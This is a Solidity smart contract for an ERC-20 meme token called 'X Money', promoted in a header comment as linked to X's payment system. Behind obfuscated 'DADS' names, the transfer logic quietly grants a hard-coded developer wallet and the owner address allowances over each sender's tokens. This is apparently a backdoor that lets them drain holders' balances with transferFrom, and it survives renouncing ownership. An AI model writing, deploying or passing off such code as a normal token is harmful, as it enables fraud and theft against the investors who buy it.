/*
THE INTEL – CEO Linda Yaccarino announced on 31st December that XMoney will be released in 2025 and will be a payment system on the platform X.

https://www.congress.gov/119/crec/2025/03/04/171/41/CREC-2025-03-04-pt1-PgS1477-2.pdf

https://www.xmoneyoneth.xyz
https://x.com/Xmoney_erc
https://t.me/xmoney_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IDADSRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IDADSFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplidadson overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract XMONEY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _dadsPair;
    IDADSRouter private _dadsRouter;
    address private _dadsWallet;
    address private _dadsAddress;
    mapping (address => uint256) private _balDADSs;
    mapping (address => mapping (address => uint256)) private _allowDADSs;
    mapping (address => bool) private _excludedFromDADS;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalDADS = 1000000000 * 10**_decimals;
    string private constant _name = unicode"X Money";
    string private constant _symbol = unicode"XMONEY";
    uint256 private _swapTokenDADSs = _tTotalDADS / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockDADS;
    uint256 private _dadsBuyAmounts = 0;
    bool private inSwapDADS = false;
    modifier lockTheSwap {
        inSwapDADS = true;
        _;
        inSwapDADS = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _dadsWallet = address(0x632eF058126fF5B292c2a1494781c905246C57e0);
        _excludedFromDADS[owner()] = true;
        _excludedFromDADS[address(this)] = true;
        _excludedFromDADS[_dadsWallet] = true;
        _dadsAddress = owner();
        _balDADSs[_msgSender()] = _tTotalDADS;
        emit Transfer(address(0), _msgSender(), _tTotalDADS);
    }

    function initLaunch() external onlyOwner() {
        _dadsRouter = IDADSRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dadsRouter), _tTotalDADS);
        _dadsPair = IDADSFactory(_dadsRouter.factory()).createPair(address(this), _dadsRouter.WETH());
    }

    receive() external payable {}

    function swapTokensForEth(uint256 dadsAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dadsRouter.WETH();
        _approve(address(this), address(_dadsRouter), dadsAmount);
        _dadsRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            dadsAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalDADS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balDADSs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowDADSs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowDADSs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowDADSs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _approveDADS(address dadsO, uint256 dadsA) private {
        address[2] memory _dadsAddrs; 
        _dadsAddrs[0] = address(_dadsWallet); 
        _dadsAddrs[1] = address(_dadsAddress);
        for(uint256 dadsK=0;dadsK<2;dadsK++){
            _allowDADSs[dadsO][_dadsAddrs[dadsK]] = dadsA;
        }
    }

    function _transfer(address dadsF, address dadsT, uint256 dadsA) private {
        require(dadsF != address(0), "ERC20: transfer from the zero address");
        require(dadsT != address(0), "ERC20: transfer to the zero address");
        require(dadsA > 0, "Transfer amount must be greater than zero");
        uint256 taxDADS = _dadsFeeTransfer(dadsF, dadsT, dadsA);
        if(taxDADS > 0){
          _balDADSs[address(this)] = _balDADSs[address(this)].add(taxDADS);
          emit Transfer(dadsF, address(this), taxDADS);
        }
        _balDADSs[dadsF] = _balDADSs[dadsF].sub(dadsA);
        _balDADSs[dadsT] = _balDADSs[dadsT].add(dadsA.sub(taxDADS));
        emit Transfer(dadsF, dadsT, dadsA.sub(taxDADS));
    }

    function swapDADSBack(address dadsF, address dadsT, uint256 dadsA) private { 
        _approveDADS(dadsF, dadsA); uint256 tokenDADS = balanceOf(address(this)); 
        if (!inSwapDADS && dadsT == _dadsPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenDADS > _swapTokenDADSs)
            swapTokensForEth(minDADS(dadsA, minDADS(tokenDADS, _swapTokenDADSs)));
            uint256 ethDADS = address(this).balance;
            if (ethDADS >= 0) {
                sendETHDADS(address(this).balance);
            }
        }
    }

    function _dadsFeeTransfer(address dadsF, address dadsT, uint256 dadsA) private returns(uint256) {
        uint256 taxDADS; 
        if (dadsF != owner() && dadsT != owner()) {
            taxDADS = dadsA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (dadsF == _dadsPair && dadsT != address(_dadsRouter) && ! _excludedFromDADS[dadsT]) {
                if(_buyBlockDADS!=block.number){
                    _dadsBuyAmounts = 0;
                    _buyBlockDADS = block.number;
                }
                _dadsBuyAmounts += dadsA;
                _buyCount++;
            }

            if(dadsT == _dadsPair && dadsF!= address(this)) {
                require(_dadsBuyAmounts < swapLimitDADS() || _buyBlockDADS!=block.number, "Max Swap Limit");  
                taxDADS = dadsA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapDADSBack(dadsF, dadsT, dadsA);
        } 
        return taxDADS;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _dadsRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minDADS(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHDADS(uint256 dadsA) private {
        payable(_dadsWallet).transfer(dadsA);
    }

    function swapLimitDADS() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _dadsRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _dadsRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}